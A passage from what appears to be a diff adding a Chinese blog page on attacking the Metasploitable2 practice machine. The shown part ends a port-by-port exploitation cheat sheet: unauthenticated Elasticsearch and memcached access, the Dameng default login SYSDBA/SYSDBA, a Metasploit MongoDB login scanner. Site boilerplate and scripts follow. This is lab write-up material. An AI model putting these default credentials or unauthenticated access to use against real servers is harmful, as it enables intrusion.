class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#9200端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> elasticsearch未授权访问</span><br><span class="line">   访问URL即可</span><br><span class="line">   http:<span class="comment">//IP:9200/_nodes</span></span><br><span class="line">   http:<span class="comment">//IP:9200/_river</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#11211端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> memcached未授权访问(dbscanner)</span><br><span class="line">   telnet &lt;target&gt; <span class="number">11211</span></span><br><span class="line">   nc -vv &lt;target&gt; <span class="number">11211</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#12345端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 达梦数据库默认口令</span><br><span class="line">   账号：SYSDBA</span><br><span class="line">    	密码SYSDBA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#27017端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> mongodb未授权访问</span><br><span class="line">   auxiliary/scanner/mongodb/mongodb_login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#50070端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> hadoop未授权访问</span><br></pre></td></tr></table></figure>
+
+<p>   原文链接：<a href="https://blog.csdn.net/Alluresec/article/details/103171729" target="_blank" rel="noopener">https://blog.csdn.net/Alluresec/article/details/103171729</a></p>
+<p> <a href="https://miraitowa2.top/2019/03/21/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考文章</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年06月15日 16:06:30<br>
+  <span>原始链接:</span><a href="/2020/06/15/Metasploitable2/" title="Metasploitable2靶机渗透">https://cyzcc.vip/2020/06/15/Metasploitable2/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/06/Os-hackNos-1/" rel="next" title="vulnhub靶机Os-hackNos-1">
+                <i class="fa fa-chevron-left"></i> vulnhub靶机Os-hackNos-1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/15/Vulnstack%E4%B8%80/" rel="prev" title="[域渗透]Vulnstack(一)">
+                [域渗透]Vulnstack(一) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机介绍"><span class="nav-number">1.</span> <span class="nav-text">靶机介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#主机发现"><span class="nav-number">2.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口扫描"><span class="nav-number">3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常用端口利用总结"><span class="nav-number">4.</span> <span class="nav-text">常用端口利用总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#21端口"><span class="nav-number">4.1.</span> <span class="nav-text">21端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22端口"><span class="nav-number">4.2.</span> <span class="nav-text">22端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23端口"><span class="nav-number">4.3.</span> <span class="nav-text">23端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25端口"><span class="nav-number">4.4.</span> <span class="nav-text">25端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#53端口"><span class="nav-number">4.5.</span> <span class="nav-text">53端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80端口"><span class="nav-number">4.6.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#139-445端口"><span class="nav-number">4.7.</span> <span class="nav-text">139/445端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2121端口"><span class="nav-number">4.8.</span> <span class="nav-text">2121端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2409端口"><span class="nav-number">4.9.</span> <span class="nav-text">2409端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3306端口"><span class="nav-number">4.10.</span> <span class="nav-text">3306端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3632端口"><span class="nav-number">4.11.</span> <span class="nav-text">3632端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5432端口"><span class="nav-number">4.12.</span> <span class="nav-text">5432端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5900端口"><span class="nav-number">4.13.</span> <span class="nav-text">5900端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6667端口"><span class="nav-number">4.14.</span> <span class="nav-text">6667端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8180端口"><span class="nav-number">4.15.</span> <span class="nav-text">8180端口</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#汇总"><span class="nav-number">5.</span> <span class="nav-text">汇总</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.4k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">150.4k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
